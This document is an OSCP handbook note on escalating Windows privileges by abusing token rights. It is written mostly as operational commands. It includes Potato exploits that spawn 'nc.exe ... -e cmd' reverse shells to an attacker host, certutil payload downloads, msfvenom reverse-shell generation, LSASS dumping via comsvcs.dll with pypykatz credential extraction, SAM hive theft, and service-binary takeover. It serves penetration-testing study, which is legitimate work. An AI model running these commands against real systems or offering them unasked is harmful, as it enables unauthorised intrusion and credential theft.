---
title: "Windows Token Privileges"
slug: windows-token-privileges
category: notes
handbook: oscp
tags: ["privilege-escalation", "windows"]
draft: false
pubDatetime: 2026-07-22T08:58:39+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Windows assigns privileges to users and groups."
---
Windows assigns privileges to users and groups. Some of them (a handful of `Se*Privilege` rights) are enough on their own to reach SYSTEM. From a service-account foothold this is usually the fastest escalation, so it sits first on the [Privilege Escalation (Windows)](/collections/oscp/privilege-escalation-windows) triage list.

## List Privileges

```cmd
whoami /priv
```

Disabled in the State column does not matter. If the privilege is listed, the account holds it and can enable it. The rights below are the ones worth acting on.

## SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege

These grant the ability to impersonate a token the process can obtain, or to assign a token to a new process. Service accounts (IIS `AppPool`, MSSQL, and similar) hold `SeImpersonatePrivilege` by default, so web and database shells arrive with it in place. The "Potato" family coerces a SYSTEM process to authenticate to a listener under attacker control, captures its token, and spawns a process with it.

Holding either privilege, even with State `Disabled`, makes a Potato viable; the build only decides which tool runs. A session that lists neither privilege, a regular user over WinRM or SSH, has no Potato path at all and no tool in the family applies.

### Fingerprint the Target First

The build number picks the tool, so read it before downloading anything. The registry works from any shell, including a webshell with no `systeminfo`:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Two build lines matter. The upper line is **17763** (Server 2019 / Windows 10 1809), which patched the DCOM path JuicyPotato abused. At or above it, JuicyPotato fails no matter how the command is written, and time spent on it is wasted. The failure is immediate and recognizable: it dies right after the `Testing {CLSID} <port>` line with `COM => recv failed with error: 10038`, before any token capture (seen on build 18362, Billyboss). The lower line is **7601** (Server 2008 R2 SP1 / Windows 7 SP1), the oldest system PrintSpoofer supports; GodPotato starts higher still at **9200** (Server 2012 / Windows 8). Below 7601, on plain Server 2008 (6001) and older, JuicyPotato is the only path to SYSTEM.

Once the build is 7601 or higher and JuicyPotato is no longer the sole option, two more checks split the modern tools:

```cmd
sc query spooler
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s /v Version
```

A running spooler means PrintSpoofer, which needs nothing on the attacker side. A stopped spooler means GodPotato, in the build matching the .NET version found above. `System Type` from `systeminfo` picks the 32-bit or 64-bit binary.

### Choosing

Match `CurrentBuildNumber` to the table. One column per tool, so the row where the build lands answers which ones apply:

| Build              | OS                                 | JuicyPotato | PrintSpoofer    | GodPotato / SigmaPotato |
| ------------------ | ---------------------------------- | ----------- | --------------- | ----------------------- |
| 3790 / 6001 / 6002 | Server 2003 / 2008 (non-R2)        | works       | no              | no                      |
| 7600 / 7601        | Server 2008 R2, Windows 7          | works       | works (spooler) | no                      |
| 9200 / 9600        | Server 2012 / 2012 R2, Win 8 / 8.1 | works       | works (spooler) | works                   |
| 14393              | Server 2016, Win 10 pre-1809       | works       | works (spooler) | works                   |
| 17763              | Server 2019, Win 10 1809           | **dead**    | works (spooler) | works                   |
| 20348              | Server 2022                        | **dead**    | works (spooler) | works                   |
| 26100              | Server 2025, Win 11 24H2           | **dead**    | works (spooler) | works                   |

"spooler" means the Print Spooler service must be running (`sc query spooler` above). GodPotato cells assume .NET 4, which Windows 8 / Server 2012 and later ship by default, so `GodPotato-NET4` runs there without installing anything. RoguePotato is the fallback on 17763 and later when the spooler is stopped and GodPotato is blocked. SigmaPotato shares the GodPotato column: same exploit underneath, validated by its author on Windows 8 through 11 and Server 2012 through 2022, and expected to behave identically elsewhere in the range.

PrintSpoofer answering `Operation failed or timed out` is not a verdict on the privilege: it waits on the spooler's named pipe, and a missing or unresponsive spooler means nothing ever answers. The two `nc.exe` path shapes being tried first rules out the payload, and the next stop is a GodPotato-core tool, which ignores the spooler entirely (OSCP B 151: two PrintSpoofer shapes timed out, SigmaPotato landed SYSTEM first try).

The family has moved on from the course material:

- **PrintSpoofer** (`itm4n/PrintSpoofer`). Uses the print spooler over a named pipe. Works from Windows 7 / Server 2008 R2 SP1 through every later build, Server 2022 and 2025 included, as long as the Print Spooler service is running.

  ```cmd
  PrintSpoofer64.exe -i -c cmd.exe
  PrintSpoofer64.exe -c "C:\Users\Public\nc.exe KALI 443 -e cmd"
  ```

- **GodPotato** (`BeichenDream/GodPotato`). The current general-purpose choice. Works on Windows 8 / Server 2012 and every later build, Server 2022 and 2025 included. Needs .NET 2.0 or later, and those systems ship .NET 4.x by default, so `GodPotato-NET4` is the usual build; NET2 and NET35 exist for older runtimes:

  ```cmd
  GodPotato-NET4.exe -cmd "cmd /c whoami"
  GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe KALI 443 -e cmd"
  ```

- **RoguePotato** (`antonioCoco/RoguePotato`) for Server 2019 / Windows 10 1809 and later when PrintSpoofer is blocked. Needs an OXID resolver redirect on port 135 back to the attacker.
- **JuicyPotato** (`ohpe/juicy-potato`). Works on every build below 17763, but it is the only option on the oldest era, Server 2003 / 2008 (non-R2), where the newer tools do not reach. Dead at 17763 and later. Its default CLSID is BITS `{4991d34b-80a1-4291-83b6-3328366b9097}`; the repo ships per-OS CLSID lists, but the oldest is Server 2008 R2 (none for plain 2008), so fall back to the BITS default or extract one with the bundled `GetCLSID.ps1`. `-l` is a free local COM port, `-t *` tries both token-creation paths, and `-z` tests a CLSID and prints the captured user without launching anything:

  ```cmd
  JuicyPotato.exe -z -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097}
  JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -p C:\Users\Public\nc.exe -a "KALI 443 -e cmd" -t *
  ```

  `JuicyPotatoNG` is an updated JuicyPotato variant.

- **SigmaPotato** (`tylerdotrar/SigmaPotato`). GodPotato derivative: same exploit core, same build range (Windows 8 through 11, Server 2012 through 2022), so it never changes which tool the table picks. Adds a built-in PowerShell reverse shell that needs no staged binary, .NET reflection for running the whole tool from memory, and a minor AV heuristics bypass (the author concedes current Defender still catches the binary). It is the tool to reach for when the potato escalates but a staged payload is the suspect. Arguments are implied, so no `-cmd`: a bare quoted command, or `--revshell` with an IP and port. A `SigmaPotatoCore.exe` build in the same release targets old runtimes (.NET 2.0/3.5) and PowerShell Core reflection; the default `SigmaPotato.exe` behaves like `GodPotato-NET4`:

  ```cmd
  SigmaPotato.exe "cmd /c whoami"
  SigmaPotato.exe --revshell KALI 443
  ```

### Getting the Binaries

None of these ship with Kali, they come from GitHub releases. Pinning a version tag in a note guarantees a dead link later, so resolve the latest release through the API instead and stage everything in `~/OSCP/tools`, the directory [File Transfers](/collections/oscp/file-transfers) serves from:

```bash
mkdir -p ~/OSCP/tools && cd ~/OSCP/tools

curl -sL "$(curl -s https://api.github.com/repos/itm4n/PrintSpoofer/releases/latest \
  | grep -o 'https://[^"]*PrintSpoofer64\.exe')" -o PrintSpoofer64.exe

curl -sL "$(curl -s https://api.github.com/repos/BeichenDream/GodPotato/releases/latest \
  | grep -o 'https://[^"]*GodPotato-NET4\.exe')" -o GodPotato-NET4.exe

curl -sL "$(curl -s https://api.github.com/repos/tylerdotrar/SigmaPotato/releases/latest \
  | grep -o 'https://[^"]*SigmaPotato\.exe')" -o SigmaPotato.exe

cp /usr/share/windows-resources/binaries/nc.exe .
file *.exe
```

`file` confirms the downloads are PE binaries rather than an HTML error page, which is what a rate-limited or renamed asset returns. Swap `NET4` for `NET35` or `NET2` to match the runtime found above. `nc.exe` already ships with Kali and does not need downloading.

JuicyPotato is architecture-bound and the ohpe repo only ships x64. Its single release (`ohpe/juicy-potato` v0.1, `JuicyPotato.exe`) is a 64-bit PE, so it dies on a 32-bit OS with "not compatible with the version of Windows you're running." The x86 build comes from a separate fork, `ivanitlearning/Juicy-Potato-x86`. Grab the one matching `System Type` from `systeminfo`:

```bash
# x64 (ohpe, original)
curl -sL "$(curl -s https://api.github.com/repos/ohpe/juicy-potato/releases/latest \
  | grep -o 'https://[^"]*JuicyPotato\.exe')" -o JuicyPotato.exe

# x86 (ivanitlearning fork)
curl -sL "https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe" -o JuicyPotato.exe
```

`file` the result: x64 shows `PE32+ executable`, x86 shows `PE32 executable (console) Intel 80386`. Stage the one that matches the target.

### Staging and Firing

Serve the directory, pull the files into `C:\Users\Public`, and call back. The web root is the wrong destination: the application pool identity often cannot write there, and anything dropped in it is reachable by anyone who finds the URL. `C:\Windows\Temp` is the other common staging path, but it fails for non-elevated footholds: on legacy systems a non-admin write there is silently redirected to `%LOCALAPPDATA%\VirtualStore\Windows\Temp`, so `certutil` reports success and `dir C:\Windows\Temp` shows nothing. `C:\Users\Public` is writable by both the low-priv account and the SYSTEM process the potato spawns, so it is the better default.

```bash
# Kali, terminal 1
cd ~/OSCP/tools && python3 -m http.server&& python3 -m http.server sudo python3 -m http.server 80

# Kali, terminal 2
nc -lvnp 443
```

The launch flag (`-p` JuicyPotato, `-c` PrintSpoofer, `-cmd` GodPotato) just runs an EXE as SYSTEM, and the reliable payload for all of them is the nc shape: the potato runs `nc.exe KALI 443 -e cmd` and the listener gets a live `cmd`. A `msfvenom` reverse-shell EXE launched directly by the potato is the tempting alternative ([msfvenom](/collections/oscp/msfvenom)) and has failed both times it was tried in the labs: on Billyboss and again on Craft the exe connected back and sat silent while the potato itself reported SYSTEM, and the nc shape through the same invocation caught immediately. When the potato prints SYSTEM and the listener stays quiet, swap the payload shape before touching anything else. The `-cmd` path must also be absolute: `.\nc.exe` resolves against the child's working directory, not the one the command was typed in. With the shape and path already right and the listener confirmed, the remaining suspect is Defender killing the staged binary on launch. SigmaPotato's `--revshell` sidesteps it by spawning a PowerShell payload with no `nc.exe` on disk. See [Reverse Shells](/collections/oscp/reverse-shells).

The payload EXE and the potato binary must both match the target's architecture. `System Type: X86-based PC` means 32-bit: use the x86 JuicyPotato and generate the shell with `windows/shell_reverse_tcp` (no `x64` in the name). A 64-bit shell on a 32-bit OS fails with `CreateProcessWithTokenW Failed to create proc: 216` (arch mismatch, the failure modes are tabled in [msfvenom Architecture Has to Match](/collections/oscp/msfvenom#architecture-has-to-match)). The potato still captures the SYSTEM token (the `NT AUTHORITY\SYSTEM` line prints), it just cannot launch the mismatched payload. Generate the shell on the Kali attack box, not the target:

```bash
# on Kali
msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o shell.exe   # 32-bit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o shell.exe   # 64-bit
```

```cmd
:: target, through the webshell
certutil -urlcache -split -f http://KALI/PrintSpoofer64.exe C:\Users\Public\ps.exe
certutil -urlcache -split -f http://KALI/nc.exe C:\Users\Public\nc.exe

C:\Users\Public\ps.exe -c "C:\Users\Public\nc.exe KALI 443 -e cmd"
```

`-i` spawns an interactive process on the current desktop and returns nothing through a webshell, so use `-c` with an explicit command from a non-interactive foothold. GodPotato takes `-cmd` in the same position:

```cmd
C:\Users\Public\gp.exe -cmd "C:\Users\Public\nc.exe KALI 443 -e cmd"
```

JuicyPotato needs the binary plus `nc.exe`, a free local COM port in `-l`, and the CLSID in `-c`. Stage both, then fire:

```cmd
certutil -urlcache -split -f http://KALI/JuicyPotato.exe C:\Users\Public\jp.exe
certutil -urlcache -split -f http://KALI/nc.exe C:\Users\Public\nc.exe

C:\Users\Public\jp.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -p C:\Users\Public\nc.exe -a "KALI 443 -e cmd" -t *
```

If the BITS CLSID does not return SYSTEM, test alternates with `-z` (see Choosing) before swapping CLSIDs by hand.

Transfer alternatives when `certutil` is blocked, and the egress-filtering case, are in [File Transfers](/collections/oscp/file-transfers).

## SeBackupPrivilege and SeRestorePrivilege

`SeBackupPrivilege` grants read over any object regardless of its ACL; `SeRestorePrivilege` grants write. Backup does not need a Potato: it reads the SAM and SYSTEM hives that hold the local hashes (`reg save hklm\sam` / `hklm\system`), then extracts them offline with `impacket-secretsdump`. Full flow: [Windows Credential Hunting SAM, SYSTEM and SECURITY Hives](/collections/oscp/windows-credential-hunting#sam-system-and-security-hives). On a domain controller the same privilege copies `ntds.dit` through a shadow copy: [NTDS.dit Extraction](/collections/oscp/ntds-dit-extraction).

`SeRestorePrivilege` writes anywhere, so it can overwrite a service binary or a DLL loaded by a SYSTEM process, or flip a registry value, then trigger it. The abuse methods overlap with [Windows Service Exploits](/collections/oscp/windows-service-exploits).

## SeTakeOwnershipPrivilege

Grants `WRITE_OWNER` on any object. Take ownership of a target (a service binary, a DLL used by SYSTEM), then grant write access and replace it:

```cmd
takeown /f "C:\Program Files\Some Service\service.exe"
icacls "C:\Program Files\Some Service\service.exe" /grant %username%:F
```

From there it is the insecure-service-executable case in [Windows Service Exploits](/collections/oscp/windows-service-exploits).

## SeDebugPrivilege

Grants the right to open any process in the session, including LSASS, regardless of that process's ACL. Administrators hold it by default, but an Administrator token is not SYSTEM: an admin shell over WinRM, or an account granted the "Debug programs" right by GPO misconfiguration, can read every process on the box. That makes it a real user-to-SYSTEM step, not a sign that escalation already happened. The prize is not the process list but LSASS memory, which holds the credentials of everyone currently logged on, including accounts more privileged than the current shell. The same right powers token duplication (opening a SYSTEM process and reusing its token), the engine behind Meterpreter's `getsystem`; the LSASS dump below is the shell-native equivalent.

As with every privilege above, `Disabled` in the State column does not matter: present means enableable. One context detail: on a console or RDP session a non-elevated Administrator token is UAC-filtered and does not carry it, while a WinRM (network logon) session holds the full token, so over evil-winrm it shows up where a desktop shell would hide it.

### Dump LSASS

Find the PID, dump it with the built-in `comsvcs.dll`, pull the file back, parse on Kali:

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\lsass.dmp full
```

The comma form is required: `MiniDump` is an export invoked through rundll32, and `full` captures the whole process. The dump runs with the calling shell's token, so it needs SeDebugPrivilege actually in the token (or a SYSTEM shell). Transfer the file with [evil-winrm](/collections/oscp/evil-winrm) `download` ([File Transfers](/collections/oscp/file-transfers)) and parse it on Kali:

```bash
pip3 install pypykatz
pypykatz lsa minidump lsass.dmp
```

pypykatz prints every logged-on user with its NT hash, and the plaintext where a provider stored one (WDigest on older systems). That is exactly the pass-the-hash material for [AD Lateral Movement](/collections/oscp/ad-lateral-movement): a shared host a privileged user logged into gives up that user's hash from a shell that never ran as them.

A 0-byte `lsass.dmp` or a Defender kill mid-dump is the behavioural LSASS-protection rule, not a permission problem; the workarounds and the alternatives (Task Manager → Create dump file from an interactive desktop, `procdump -ma lsass.exe`) are in [Mimikatz Offline alternative: minidump and parse on Kali](/collections/oscp/mimikatz#offline-alternative-minidump-and-parse-on-kali).

## SeShutdownPrivilege

Allows a user **logged on locally** to shut down or reboot. On its own it is not a SYSTEM shell; it is the restart trigger when a service binary or autorun was replaced and `sc stop`/`start` is denied. winPEAS Autoload services come back after reboot.

```cmd
whoami /priv                    :: confirm SeShutdownPrivilege is listed
shutdown /r /t 0 /f             :: reboot now (force)
:: softer: shutdown /r /t 30 /c "maint"
```

Listener must be up before the reboot. The shell dies with the box; the callback is the new SYSTEM (or service-account) session from the replaced binary. Full plant-then-reboot flow: [Windows Service Exploits](/collections/oscp/windows-service-exploits).

### Why WinRM gets Access is denied (5)

Microsoft splits shutdown into two rights:

| Right | Constant | Applies to |
| --- | --- | --- |
| Shut down the system | `SeShutdownPrivilege` | **Local** interactive logon |
| Force shutdown from a remote system | `SeRemoteShutdownPrivilege` | Remote callers |

evil-winrm is a **network logon**. `whoami /priv` can show `SeShutdownPrivilege` Enabled and `shutdown.exe` still returns `Access is denied.(5)` because that privilege does not cover remote sessions. `SeRemoteShutdownPrivilege` is almost never on a low-priv token, so remote reboot from WinRM is the wrong expectation.

Work the trigger without circular admin:

1. Try `sc stop` / `sc start` or `net stop` / `net start` if the service ACL allows it.
2. `shutdown` needs a real **interactive local** logon (console/RDP). A reverse shell spawned from evil-winrm still inherits the WinRM network token, so `Access is denied.(5)` is expected there too. Do not waste time on that.
3. No restart path → park the plant. A local Administrator password from a DB dump is a separate privesc (log in as that account). It is not "restart the planted service."

## Summary

| Privilege | Abuse |
| --- | --- |
| SeImpersonatePrivilege | Potato to SYSTEM; the build row above picks the tool |
| SeAssignPrimaryTokenPrivilege | Same Potato tools |
| SeBackupPrivilege | Read SAM + SYSTEM hives, dump hashes |
| SeRestorePrivilege | Overwrite a SYSTEM binary, DLL, or registry value |
| SeTakeOwnershipPrivilege | `takeown` + `icacls`, then replace the object |
| SeDebugPrivilege | Dump LSASS for logged-on credentials; a real user-to-SYSTEM step |
| SeShutdownPrivilege | Reboot to load a replaced Autoload service / autorun |
